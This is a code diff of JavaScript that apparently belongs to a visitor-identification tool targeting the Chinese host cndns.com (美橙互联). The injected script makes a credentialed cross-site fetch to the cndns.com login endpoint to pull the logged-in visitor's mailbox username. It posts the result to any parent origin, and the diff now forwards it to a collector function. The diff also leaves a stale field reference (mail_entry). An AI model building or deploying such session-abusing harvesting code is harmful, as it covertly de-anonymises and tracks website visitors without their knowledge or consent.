@@ -1,26 +1,24 @@
 // 美橙互联  邮箱首页   邮箱 = 用户名
 
-function e(n) {
+function formateCndnsData(n) {
   if ('cndns' === n.data.source) {
     var e = n.data.d
     if ('10000' == e.code) {
       if (null != e.message.match(/mailbox=(.*?)&/)) {
         var t = {
           valid: !0,
-          data: { username: RegExp.$1, mail_entry: e.message },
+          data: { userName: RegExp.$1, email: e.message },
         }
         let innerHTML = `
         <div class='item'>
           <p class='title'>美橙互联</p>
           <p>邮箱: ${t.data.mail_entry}</p>
-          <p>用户名: ${t.data.username}</p>
+          <p>用户名: ${t.data.userName}</p>
         </div>
       `
-        let dom = document.createElement('div')
-        dom.innerHTML = innerHTML
-
-        document.getElementById('content').appendChild(dom)
-        console.log(t)
+        if (t.data.userName) {
+          getInifoData({ type: 'cndns', data: t.data, html: innerHTML })
+        }
       }
     }
   }
@@ -36,7 +34,7 @@ function cndns() {
     "\n    fetch('https://www.cndns.com/Ajax/Login.ashx?module=turntomail', {credentials: 'include'})\n    .then(resp => resp.json())\n    .then(function(data){let s = {source: 'cndns', d: data}; window.parent.postMessage(s, '*');})\n  "
   document.documentElement.appendChild(d)
 }
-window.addEventListener('message', e, !1)
+window.addEventListener('message', formateCndnsData, !1)
 
 // window.addEventListener('load', function () {
 cndns()
